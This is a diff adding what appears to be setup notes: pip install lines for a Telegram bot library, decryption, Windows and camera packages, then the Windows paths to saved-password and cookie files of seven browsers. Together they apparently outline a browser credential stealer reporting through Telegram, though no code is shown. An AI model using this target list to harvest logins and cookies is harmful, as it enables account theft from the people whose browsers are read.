@@ -1,0 +1,31 @@
+pip install telebot requests pillow pywin32 opencv-python
+
+pip install pycryptodome pytelegrambotapi pillow requests
+
+
+Chrome
+C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Login Data
+C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Cookies
+
+Firefox
+C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>\logins.json
+C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>\cookies.sqlite
+
+Opera
+C:\Users\<username>\AppData\Roaming\Opera Software\Opera Stable\Login Data
+C:\Users\<username>\AppData\Roaming\Opera Software\Opera Stable\Cookies
+
+Edge (Chromium-based)
+C:\Users\<username>\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
+C:\Users\<username>\AppData\Local\Microsoft\Edge\User Data\Default\Cookies
+
+Internet Explorer
+C:\Users\<username>\AppData\Local\Microsoft\Windows\INetCookies
+
+Brave (Chromium-based)
+C:\Users\<username>\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data
+C:\Users\<username>\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies
+
+Safari (Windows version, if installed)
+C:\Users\<username>\AppData\Local\Apple\Safari
+
